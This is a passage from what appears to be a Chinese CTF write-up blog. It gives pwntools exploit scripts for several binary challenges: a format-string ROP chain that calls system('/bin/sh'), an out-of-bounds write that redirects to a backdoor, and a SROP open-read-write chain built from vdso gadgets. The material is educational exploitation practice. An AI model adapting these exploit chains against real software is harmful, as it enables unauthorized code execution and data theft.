style="color:#393A34">decode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">,</span><span style="color:#2F798A"> 16</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> -</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">200</span><br><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"IO_fw_addr ===> </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#A65E2B">IO_fw_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#A65E2B">\n</span><span style="color:#B56959">str_addr ===> </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">str_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#A65E2B">\n</span><span style="color:#B56959">stack_addr ===> </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">stack_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc_addr </span><span style="color:#999999">=</span><span style="color:#A65E2B"> IO_fw_addr</span><span style="color:#AB5959"> -</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">symbols</span><span style="color:#2993a3">[</span><span style="color:#B5695977">"</span><span style="color:#B56959">_IO_file_write</span><span style="color:#B5695977">"</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">pie_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> str_addr </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">2069</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">success</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"libc_addr ===> </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">libc_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#A65E2B">\n</span><span style="color:#B56959">pie_addr ===> </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">pie_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">ret_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> stack_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">90</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">success</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"ret_addr ===> </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">ret_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">ret </span><span style="color:#999999">=</span><span style="color:#393A34"> pie_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">000000000000101a</span><br><span style="color:#393A34">system_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_addr </span><span style="color:#AB5959">+</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">symbols</span><span style="color:#2993a3">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">system</span><span style="color:#B5695977">'</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">binsh_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_addr </span><span style="color:#AB5959">+</span><span style="color:#998418"> next</span><span style="color:#2993a3">(</span><span style="color:#393A34">libc</span><span style="color:#999999">.</span><span style="color:#393A34">search</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/bin/sh</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">pop_rdi_ret </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">000000000002a3e5</span><br><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">success</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"system_addr ===> </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">system_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#A65E2B">\n</span><span style="color:#B56959">binsh_addr ===> </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">binsh_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#A65E2B">\n</span><span style="color:#B56959">pop_rdi_ret ===> </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">payload2 </span><span style="color:#999999">=</span><span style="color:#393A34"> fmtstr_payload</span><span style="color:#2993a3">(</span><span style="color:#2F798A">8</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><span style="color:#393A34">ret_addr</span><span style="color:#999999">:</span><span style="color:#393A34"> pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> ret_addr </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 8</span><span style="color:#999999">:</span><span style="color:#393A34"> binsh_addr</span><span style="color:#999999">,</span><span style="color:#393A34"> ret_addr </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 16</span><span style="color:#999999">:</span><span style="color:#393A34"> ret</span><span style="color:#999999">,</span><span style="color:#393A34"> ret_addr </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 24</span><span style="color:#999999">:</span><span style="color:#393A34"> system_addr</span><span style="color:#1e754f">}</span><span style="color:#999999">,</span><span style="color:#B07D48"> write_size</span><span style="color:#999999">=</span><span style="color:#B5695977">"</span><span style="color:#B56959">short</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload2</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre></div>
<p>顺带一提 pwntools 的 fmtstr_payload 针对 x64 的模块已经修好了，真好使啊<del>两年前还是坏的</del></p>
<h2 id="zoo" class="scroll-target"><a href="#zoo"><code class="hash inline-code">#</code>ZoO</a></h2>
<blockquote>
<p>[hard] ZoO!</p>
<p>Welcome to the zoo! You can feed the small animals here. The flag is placed in a location that you cannot touch.</p>
<p>PS:
The flag is a series of numbers, and the complete flag format is <code class="inline-code">t1dctf{***}</code>.</p>
</blockquote>
<p>这题折腾了挺久的，总算是完整复现出来了（（</p>
<p>第一个点在于逆向结构体，这里总结了点<a href title>逆向结构体的经验</a>。</p>
<p>第二个点在于找溢出，不过如果第一个逆清楚了的话其实这里问题不大，显然是存在数组越界的，对于同一个 bin 可以创建 5 个 entry，前 4 个填满数组，第五个相当于越界读写，可以写 ret addr。</p>
<p>第三个点在于找利用链，这个题没给任意地址写，只有部分地址写，所以没办法构造 ROP 链子完整泄漏 libc 打，但是题里有一个 <code class="inline-code">backdoor</code>:</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-nasm language-nasm">endbr64
push    rbp
mov     rbp, rsp
mov     [rbp+var_8], rdi
mov     [rbp+var_10], rsi
pop     rbp
retn
</code></pre></div>
<p>相当于会把 rdi 和 rsi 存下来，我们去 ret addr 看看，发现 ret 时 rdi 是 func1 里用到的 map 地址，rsi 是 <code class="inline-code">useless</code>，那么直接调用 view 函数就可以把 flag 打印出来。</p>
<p>第四个点在于这个 view 函数不能从头开始调用，否则会 segment fault 退出，这是因为 gift 函数在 ret 时缺少了 <code class="inline-code">mov rsp, rbp</code>，解决方法也简单，从 <code class="inline-code">view + 5</code> 开始调用就行。</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./pwn</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">""</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">ZoO!</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">b *$rebase(0x1483)</span><span style="color:#A65E2B">\n</span><span style="color:#B56959">b *$rebase(0x1a07)</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> feed</span><span style="color:#2993a3">(</span><span style="color:#393A34">name</span><span style="color:#999999">,</span><span style="color:#393A34"> amount</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">> </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">1</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">></span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">name</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">></span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#998418">str</span><span style="color:#1e754f">(</span><span style="color:#393A34">amount</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#A0ADA0"># pause()</span><br><span style="color:#393A34">feed</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">1</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">feed</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">1F</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">feed</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">1FF</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">feed</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">1FFF</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">four</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">feed</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">1FFFF</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#AB5959"> -0x</span><span style="color:#2F798A">4fc</span><span style="color:#AB5959">+</span><span style="color:#2F798A">5</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre></div>
<h2 id="strange" class="scroll-target"><a href="#strange"><code class="hash inline-code">#</code>strange</a></h2>
<blockquote>
<p>[Inferno] strange!?</p>
<p>I heard you're good at orw? Give this a try!</p>
<p>PS:
This is not the kernel! This is not the kernel! This is not the kernel! But debugging techniques used for the kernel can be employed for debugging. Pay attention to subtle differences caused by local and system kernel versions!</p>
</blockquote>
<p>题目给了 qemu 启动脚本和一个内核文件系统，看看里面的 hello，发现是个没用调用任何库函数的 i386 程序，只开了 NX，提示打 orw。</p>
<p>问题是程序本身的 gadgets 非常少。</p>
<p>这里提一下 SROP，这里需要提一下，<code class="inline-code">sigreturn</code> 这个系统调用和别的系统调用有一个不同的地方，即一般的应用程序不会主动调用它，而是由内核将相应地址填到栈上，使得应用进程被动地调用。因此在系统中一般会有一段代码专门用来调用<code class="inline-code">sigreturn</code>，在不同的类UNIX系统中，这段代码会出现在不同的位置，如下图所示：</p>
<p><img src="https://pic.imgdb.cn/item/6735971bd29ded1a8c516119.png" alt/></p>
<p>所以可以在这个 hello 程序的 vdso 里找到相当多的 gadgets。</p>
<p>有一个点是 SROP 时需要把段寄存器设置正常，不然程序在系统调用的时候会 down 掉，一开始的时候不知道这个一直打不通闹麻了。</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./hello</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">arch </span><span style="color:#999999">=</span><span style="color:#B5695977"> '</span><span style="color:#B56959">i386</span><span style="color:#B5695977">'</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">""</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">vdso_addr </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">f7ffc000</span><br><span style="color:#393A34">stack_addr </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ffffccbc</span><br><span style="color:#393A34">int_0x80 </span><span style="color:#999999">=</span><span style="color:#393A34"> vdso_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">00000577</span><br><span style="color:#393A34">read_addr </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">8049000</span><br><span style="color:#393A34">sigreturn_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> vdso_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">00000591</span><br><span style="color:#393A34">resigreturn_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> vdso_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">5a0</span><br><span style="color:#393A34">ret_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> vdso_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">0000057c</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">!</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">frame </span><span style="color:#999999">=</span><span style="color:#393A34"> SigreturnFrame</span><span style="color:#2993a3">(</span><span style="color:#B07D48">kernel</span><span style="color:#999999">=</span><span style="color:#B5695977">'</span><span style="color:#B56959">i386</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">frame</span><span style="color:#999999">.</span><span style="color:#393A34">eax </span><span style="color:#999999">=</span><span style="color:#2F798A"> 5</span><span style="color:#A0ADA0"> # open</span><br><span style="color:#393A34">frame</span><span style="color:#999999">.</span><span style="color:#393A34">ebx </span><span style="color:#999999">=</span><span style="color:#393A34"> stack_addr</span><br><span style="color:#393A34">frame</span><span style="color:#999999">.</span><span style="color:#393A34">ecx </span><span style="color:#999999">=</span><span style="color:#2F798A"> 0</span><br><span style="color:#393A34">frame</span><span style="color:#999999">.</span><span style="color:#393A34">edx </span><span style="color:#999999">=</span><span style="color:#2F798A"> 0</span><br><span style="color:#393A34">frame</span><span style="color:#999999">.</span><span style="color:#393A34">ebp </span><span style="color:#999999">=</span><span style="color:#2F798A"> 0</span><br><span style="color:#393A34">frame</span><span style="color:#999999">.</span><span style="color:#393A34">eip </span><span style="color:#999999">=</span><span style="color:#393A34"> int_0x80</span><br><span style="color:#393A34">frame</span><span style="color:#999999">.</span><span style="color:#393A34">esp </span><span style="color:#999999">=</span><span style="color:#393A34"> stack_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">24</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 80</span><br><br><span style="color:#A0ADA0"># 段寄存器要恢复</span><br><span style="color:#393A34">frame</span><span style="color:#999999">.</span><span style="color:#393A34">cs </span><span style="color:#999999">=</span><span style="color:#2F798A"> 35</span><br><span style="color:#393A34">frame</span><span style="color:#999999">.</span><span style="color:#393A34">ss </span><span style="color:#999999">=</span><span style="color:#2F798A"> 43</span><br><span style="color:#393A34">frame</span><span style="color:#999999">.</span><span style="color:#393A34">ds </span><span style="color:#999999">=</span><span style="color:#2F798A"> 43</span><br><span style="color:#393A34">frame</span><span style="color:#999999">.</span><span style="color:#393A34">es </span><span style="color:#999999">=</span><span style="color:#2F798A"> 43</span><br><span style="color:#393A34">frame</span><span style="color:#999999">.</span><span style="color:#393A34">fs </span><span style="color:#999999">=</span><span style="color:#2F798A"> 0</span><br><span style="color:#393A34">frame</span><span style="color:#999999">.</span><span style="color:#393A34">gs </span><span style="color:#999999">=</span><span style="color:#2F798A"> 0</span><br><br><span style="color:#393A34">frame2 </span><span style="color:#999999">=</span><span style="color:#393A34"> SigreturnFrame</span><span style="color:#2993a3">(</span><span style="color:#B07D48">kernel</span><span style="color:#999999">=</span><span style="color:#B5695977">'</span><span style="color:#B56959">i386</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">frame2</span><span style="color:#999999">.</span><span style="color:#393A34">eax </span><span style="color:#999999">=</span><span style="color:#2F798A"> 3</span><span style="color:#A0ADA0"> # read</span><br><span style="color:#393A34">frame2</span><span style="color:#999999">.</span><span style="color:#393A34">ebx </span><span style="color:#999999">=</span><span style="color:#2F798A"> 3</span><br><span style="color:#393A34">frame2</span><span style="color:#999999">.</span><span style="color:#393A34">ecx </span><span style="color:#999999">=</span><span style="color:#393A34"> stack_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">200</span><br><span style="color:#393A34">frame2</span><span style="color:#999999">.</span><span style="color:#393A34">edx </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">20</span><br><span style="color:#393A34">frame2</span><span style="color:#999999">.</span><span style="color:#393A34">eip </span><span style="color:#999999">=</span><span style="color:#393A34"> int_0x80</span><br><span style="color:#393A34">frame2</span><span style="color:#999999">.</span><span style="color:#393A34">esp </span><span style="color:#999999">=</span><span style="color:#393A34"> stack_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">24</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 80</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 4</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 3</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 4</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 80</span><br><span style="color:#393A34">frame2</span><span style="color:#999999">.</span><span style="color:#393A34">cs </span><span style="color:#999999">=</span><span style="color:#2F798A"> 35</span><br><span style="color:#393A34">frame2</span><span style="color:#999999">.</span><span style="color:#393A34">ss </span><span style="color:#999999">=</span><span style="color:#2F798A"> 43</span><br><span style="color:#393A34">frame2</span><span style="color:#999999">.</span><span style="color:#393A34">ds </span><span style="color:#999999">=</span><span style="color:#2F798A"> 43</span><br><span style="color:#393A34">frame2</span><span style="color:#999999">.</span><span style="color:#393A34">es </span><span style="color:#999999">=</span><span style="color:#2F798A"> 43</span><br><span style="color:#393A34">frame2</span><span style="color:#999999">.</span><span style="color:#393A34">fs </span><span style="color:#999999">=</span><span style="color:#2F798A"> 0</span><br><span style="color:#393A34">frame2</span><span style="color:#999999">.</span><span style="color:#393A34">gs </span><span style="color:#999999">=</span><span style="color:#2F798A"> 0</span><br><br><span style="color:#393A34">frame3 </span><span style="color:#999999">=</span><span style="color:#393A34"> SigreturnFrame</span><span style="color:#2993a3">(</span><span style="color:#B07D48">kernel</span><span style="color:#999999">=</span><span style="color:#B5695977">'</span><span style="color:#B56959">i386</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">frame3</span><span style="color:#999999">.</span><span style="color:#393A34">eax </span><span style="color:#999999">=</span><span style="color:#2F798A"> 4</span><span style="color:#A0ADA0"> # write</span><br><span style="color:#393A34">frame3</span><span style="color:#999999">.</span><span style="color:#393A34">ebx </span><span style="color:#999999">=</span><span style="color:#2F798A"> 1</span><br><span style="color:#393A34">frame3</span><span style="color:#999999">.</span><span style="color:#393A34">ecx </span><span style="color:#999999">=</span><span style="color:#393A34"> stack_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">200</span><br><span style="color:#393A34">frame3</span><span style="color:#999999">.</span><span style="color:#393A34">edx </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">20</span><br><span style="color:#393A34">frame3</span><span style="color:#999999">.</span><span style="color:#393A34">eip </span><span style="color:#999999">=</span><span style="color:#393A34"> int_0x80</span><br><span style="color:#393A34">frame3</span><span style="color:#999999">.</span><span style="color:#393A34">esp </span><span style="color:#999999">=</span><span style="color:#393A34"> stack_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">24</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 80</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 4</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 3</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 4</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 80</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 4</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 80</span><br><span style="color:#393A34">frame3</span><span style="color:#999999">.</span><span style="color:#393A34">cs </span><span style="color:#999999">=</span><span style="color:#2F798A"> 35</span><br><span style="color:#393A34">frame3</span><span style="color:#999999">.</span><span style="color:#393A34">ss </span><span style="color:#999999">=</span><span style="color:#2F798A"> 43</span><br><span style="color:#393A34">frame3</span><span style="color:#999999">.</span><span style="color:#393A34">ds </span><span style="color:#999999">=</span><span style="color:#2F798A"> 43</span><br><span style="color:#393A34">frame3</span><span style="color:#999999">.</span><span style="color:#393A34">es </span><span style="color:#999999">=</span><span style="color:#2F798A"> 43</span><br><span style="color:#393A34">frame3</span><span style="color:#999999">.</span><span style="color:#393A34">fs </span><span style="color:#999999">=</span><span style="color:#2F798A"> 0</span><br><span style="color:#393A34">frame3</span><span style="color:#999999">.</span><span style="color:#393A34">gs </span><span style="color:#999999">=</span><span style="color:#2F798A"> 0</span><br><br><span style="color:#393A34">payload1 </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">./flag</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">20</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">a</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p32</span><span style="color:#2993a3">(</span><span style="color:#393A34">sigreturn_addr</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#998418"> bytes</span><span style="color:#2993a3">(</span><span style="color:#393A34">frame</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload1 </span><span style="color:#999999">+=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">aaaa</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> +</span><span 